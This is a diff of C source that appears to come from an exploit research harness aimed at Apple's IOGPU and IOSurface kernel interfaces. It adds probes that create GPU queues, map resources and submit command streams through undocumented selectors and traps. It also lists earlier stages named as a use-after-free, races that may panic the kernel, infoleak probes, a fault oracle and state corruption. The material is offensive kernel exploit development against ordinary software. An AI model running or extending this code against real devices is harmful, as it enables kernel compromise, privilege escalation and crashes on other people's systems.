+static void p_qdrive(void) {
+    LOG("[v49] queue shmem drive");
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) return;
+    uint8_t *in = must_map(0x2000);
+    uint8_t *out = must_map(0x1000);
+    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
+    size_t osz = 0x10;
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    kern_return_t kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
+    if (kr) { LOG("[qd] sel6 kr 0x%08x", kr); return; }
+    LOG("[qd] qid %llu tok %llx", *(uint64_t *)out, *(uint64_t *)(out + 8));
+    // find the two new regions
+    mach_vm_address_t pages[4]; int np = 0;
+    mach_vm_address_t addr = 0;
+    for (;;) {
+        mach_vm_size_t sz = 0;
+        vm_region_basic_info_data_64_t info;
+        mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+        mach_port_t obj;
+        if (mach_vm_region(mach_task_self(), &addr, &sz, VM_REGION_BASIC_INFO_64,
+                           (vm_region_info_t)&info, &cnt, &obj)) break;
+        // shmem regions: exactly 0x4000, shared, not ours (we track by protection+sharing?)
+        if (sz == 0x4000 && addr >= 0x100000000 && addr < 0x200000000) {
+            uint8_t *b = (uint8_t *)(uintptr_t)addr;
+            // heuristic: zero or counter start, and not previously known malloc
+            pages[np++] = addr;
+        }
+        addr += sz;
+        if (!sz || np >= 4) break;
+    }
+    LOG("[qd] candidate pages: %d", np);
+    // heuristics unreliable; use the LAST two 0x4000 regions in that range
+    if (np < 2) { LOG("[qd] not found"); return; }
+    volatile uint32_t *ctrl = (volatile uint32_t *)(uintptr_t)pages[np-1];
+    volatile uint32_t *data = (volatile uint32_t *)(uintptr_t)pages[np-2];
+    LOG("[qd] ctrl %p data %p", ctrl, data);
+    for (int i = 0; i < 16; i += 4)
+        LOG("[qd] ctrl+%02x: %08x %08x %08x %08x", i*4, ctrl[i], ctrl[i+1], ctrl[i+2], ctrl[i+3]);
+    for (int i = 0; i < 16; i += 4)
+        LOG("[qd] data+%02x: %08x %08x %08x %08x", i*4, data[i], data[i+1], data[i+2], data[i+3]);
+    // doorbell with no writes
+    for (uint64_t db = 1; db <= 3; db++) {
+        kern_return_t kt = ioconnect_trap1(c, 1, db);
+        LOG("[qd] trap1(1, %llu) -> kr 0x%08x | ctrl now %08x %08x %08x %08x",
+            db, kt, ctrl[0], ctrl[1], ctrl[2], ctrl[3]);
+        usleep(100000);
+    }
+    LOG("[v49] done (alive)");
+}
+
+
+// V50: end-to-end submit — queue + 2 resources + command stream in resource B.
+// Command stream: commands >= 0x10, header u32 @+0xc (bit31=end, bits29:0=type).
+static io_connect_t g_gpu;
+static uint32_t gpu_resource(io_connect_t c, uint8_t *buf, uint64_t size) {
+    uint8_t *in = must_map(0x1000);
+    uint8_t *out = must_map(0x1000);
+    memset(in, 0, 0x1000); memset(out, 0, 0x1000);
+    *(uint32_t *)(in + 0x00) = 0x80;
+    *(uint32_t *)(in + 0x30) = 1;
+    *(uint64_t *)(in + 0x38) = (uint64_t)(uintptr_t)buf + size;
+    *(uint64_t *)(in + 0x40) = (uint64_t)(uintptr_t)buf;
+    *(uint64_t *)(in + 0x48) = size;
+    size_t osz = 0x58;
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    kern_return_t kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x68, osc, &nosc, out, &osz);
+    uint32_t rid = *(uint32_t *)(out + 0x24);
+    LOG("[sm] resource buf %p sz 0x%llx -> kr 0x%08x rid %u", buf, size, kr, rid);
+    vm_deallocate(mach_task_self(), (vm_address_t)in, 0x1000);
+    vm_deallocate(mach_task_self(), (vm_address_t)out, 0x1000);
+    return kr ? 0 : rid;
+}
+static uint64_t g_qid;
+static kern_return_t gpu_submit(uint8_t *entry) {
+    uint64_t sc[4] = { g_qid, 0, 1, 0x40 };
+    uint64_t sout[2] = {0,0}; uint32_t scnt = 1;
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    return IOConnectCallMethod(g_gpu, 25, sc, 4, entry, 0x40, sout, &scnt, NULL, NULL);
+}
+static void p_submit(void) {
+    LOG("[v50] end-to-end submit");
+    g_gpu = open_service("IOGPU", 1);
+    if (!g_gpu) return;
+    // queue
+    uint8_t *in = must_map(0x2000);
+    uint8_t *out = must_map(0x1000);
+    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
+    size_t osz = 0x10;
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    kern_return_t kr = IOConnectCallMethod(g_gpu, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
+    g_qid = *(uint64_t *)out;
+    LOG("[sm] queue kr 0x%08x qid %llu", kr, g_qid);
+    if (kr) return;
+
+    uint8_t *bufA = must_map(0x4000);
+    uint8_t *bufB = must_map(0x4000);
+    memset(bufA, 0x11, 0x4000);
+    memset(bufB, 0, 0x4000);
+    uint32_t ridA = gpu_resource(g_gpu, bufA, 0x4000);
+    uint32_t ridB = gpu_resource(g_gpu, bufB, 0x4000);
+    if (!ridA || !ridB) { LOG("[sm] resources failed"); return; }
+
+    uint8_t *entry = must_map(0x1000);
+    // stIn size / count matrix for sel 25
+    memset(bufB, 0, 0x4000);
+    *(uint32_t *)(bufB + 0xc) = 0x80000000;
+    memset(entry, 0, 0x1000);
+    *(uint32_t *)(entry + 0x00) = ridA;
+    *(uint32_t *)(entry + 0x04) = ridB;
+    static const size_t oszs[] = { 0, 0x10, 0x40, 0x100 };
+    for (unsigned i = 0; i < sizeof(oszs)/sizeof(size_t); i++) {
+        uint64_t sc[4] = { g_qid, 0, 1, 0x40 };
+        uint64_t so[1] = {0}; uint32_t sc2 = 1;
+        uint64_t o2[4] = {0,0,0,0}; uint32_t n2 = 0;
+        size_t osz2 = oszs[i];
+        memset(out, 0xAA, 0x1000);
+        kern_return_t k2 = IOConnectCallMethod(g_gpu, 25, sc, 4, entry, 0x40, so, &sc2,
+                                               oszs[i] ? out : NULL, &osz2);
+        LOG("[sm] sel25 stOut 0x%zx -> kr 0x%08x scOut %llx osz2 0x%zx", oszs[i], k2, so[0], osz2);
+    }
+    // trap0 submit (bypasses sel25 wrapper): p1=qid p2=size p3=entryVA p4=outVA
+    {
+        memset(bufB, 0, 0x4000);
+        *(uint32_t *)(bufB + 0xc) = 0x80000000;
+        memset(entry, 0, 0x1000);
+        *(uint32_t *)(entry + 0x00) = ridA;
+        *(uint32_t *)(entry + 0x04) = ridB;
+        uint32_t *outw = (uint32_t *)must_map(0x100);
+        *outw = 0xdeadbeef;
+        kern_return_t kt = ioconnect_trap4(g_gpu, 0, g_qid, 0x40,
+                                           (uintptr_t)entry, (uintptr_t)outw);
+        LOG("[sm] trap0 submit -> kr 0x%08x outw %08x", kt, *outw);
+    }
+    // candidate streams
+    static const struct { uint32_t hdr; const char *n; } streams[] = {
+        { 0x80000000, "just-end" },
+        { 0x80000001, "type1-end" },
+        { 0x80000002, "type2-end" },
+        { 0x00000001, "type1-noend" },
+    };
+    for (unsigned i = 0; i < sizeof(streams)/sizeof(streams[0]); i++) {
+        memset(bufB, 0, 0x4000);
+        *(uint32_t *)(bufB + 0xc) = streams[i].hdr;   // command header
+        memset(entry, 0, 0x1000);
+        *(uint32_t *)(entry + 0x00) = ridA;
+        *(uint32_t *)(entry + 0x04) = ridB;
+        kr = gpu_submit(entry);
+        uint64_t scv = 0; { uint64_t sc[4]={g_qid,0,1,0x40}; uint64_t so[1]={0}; uint32_t sc2=1; uint64_t o2[4]={0,0,0,0}; uint32_t n2=0;
+          IOConnectCallMethod(g_gpu, 25, sc, 4, entry, 0x40, so, &sc2, NULL, NULL); scv = so[0]; }
+        LOG("[sm] stream %s (hdr %08x) -> kr 0x%08x scOut %llx", streams[i].n, streams[i].hdr, kr, scv);
+        usleep(200000);
+    }
+    LOG("[v50] done (alive)");
+}
+
+
+// V52: full submit with notification queue bound (sel24). sel14 {0x4000,0} ->
+// nq; sel6 -> queue; sel24 {qid, nqid}; then trap0/sel25 submit.
+static void p_submit2(void) {
+    LOG("[v52] submit with notif-queue bound");
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) return;
+    uint8_t *in = must_map(0x2000);
+    uint8_t *out = must_map(0x1000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    kern_return_t kr;
+
+    // notification queue: try a few count values
+    uint64_t nqid = 0;
+    static const uint64_t cnts[] = { 0x4000, 0x100, 0x1000, 0x40, 0x400, 1 };
+    for (unsigned i = 0; i < sizeof(cnts)/8 && !nqid; i++) {
+        uint64_t a[2] = { cnts[i], 0 };
+        memset(out, 0, 0x1000);
+        size_t osz = 0x10; nosc = 0;
+        kr = IOConnectCallMethod(c, 14, a, 2, NULL, 0, osc, &nosc, out, &osz);
+        LOG("[s2] sel14 count 0x%llx -> kr 0x%08x out {%llx, %llx}", cnts[i], kr,
+            *(uint64_t *)out, *(uint64_t *)(out + 8));
+        if (kr == 0) nqid = *(uint64_t *)(out + 8);
+    }
+    // command queue
+    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
+    size_t osz = 0x10; nosc = 0;
+    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
+    uint64_t qid = *(uint64_t *)out;
+    LOG("[s2] sel6 -> kr 0x%08x qid %llu", kr, qid);
+    if (kr || !qid || !nqid) { LOG("[s2] missing pieces"); return; }
+    // bind
+    uint64_t a24[2] = { qid, nqid };
+    kr = IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL);
+    LOG("[s2] sel24 bind -> kr 0x%08x", kr);
+
+    // resources
+    uint8_t *bufA = must_map(0x4000);
+    uint8_t *bufB = must_map(0x4000);
+    memset(bufA, 0x11, 0x4000);
+    memset(bufB, 0, 0x4000);
+    g_gpu = c;
+    uint32_t ridA = gpu_resource(c, bufA, 0x4000);
+    uint32_t ridB = gpu_resource(c, bufB, 0x4000);
+    if (!ridA || !ridB) return;
+
+    // trap0 submit
+    uint8_t *entry = must_map(0x1000);
+    memset(bufB, 0, 0x4000);
+    *(uint32_t *)(bufB + 0xc) = 0x80000000;
+    memset(entry, 0, 0x1000);
+    *(uint32_t *)(entry + 0x00) = ridA;
+    *(uint32_t *)(entry + 0x04) = ridB;
+    uint32_t *outw = (uint32_t *)must_map(0x100);
+    *outw = 0xdeadbeef;
+    kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+    LOG("[s2] trap0 submit -> kr 0x%08x outw %08x", kt, *outw);
+    // sel25 too
+    g_qid = qid;
+    kr = gpu_submit(entry);
+    LOG("[s2] sel25 submit -> kr 0x%08x", kr);
+    LOG("[v52] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -1128,6 +2595,32 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        p_submit2();        // v52: submit with notif-queue
+        p_submit();         // v50: end-to-end submit
+        p_qdrive();         // v49: queue shmem drive
+        p_qshmem();         // v48: queue shmem via region diff
+        p_getters();        // v47: getter dump
+        p_shmem_probe();    // v46: shmem selectors with traced values
+        p_iogpu_fw();       // v45: IOGPU.framework end-to-end
+        p_iogpu_submit();   // v44: IOGPU submit path
+        p_agx_replay();     // v43: replay Metal sequence
+        p_agx_scan();       // v42: AGX accelerator service
+        p_iogpu_vm2();      // v41: IOGPU VM full path
+        p_iogpu_vm();       // v40: IOGPU VM map path
+        p_iogpu();          // v39: IOGPU resource games
+        p_method_probe();   // v38: method tables of openable clients
+        p_surface_scan();   // v37: attack surface scan
+        p_histogram();      // v36: histogram length/infoleak probes
+        p_filter();         // v35: SetCustomFilter path
+        p_cross_race2(30);  // v34: fixed cross-request race (may panic)
+        p_oracle();         // v33: fault-oracle mapping (may panic)
+        p_diag_dart();      // v32: DART fault classification via diag
+        p_triangulate();    // v31a: start formula (may panic)
+        p_cross_race(20);   // v31b: cross-request contamination (may panic)
+        p_nc();             // v30: NC corruption observability (may panic)
+        p_calibrate();      // v29: fill start calibration (may panic)
+        p_state_corruption(); // v28: post-shot output diff (may panic)
+        p_fill_target();    // v27: fill target analysis (may panic)
         p_async_cushion();  // v26: async cushion race (may panic)
         p_flip420();        // v25: flip x biplanar dst (may panic)
         p_flip();           // v24: flip variants (may panic)
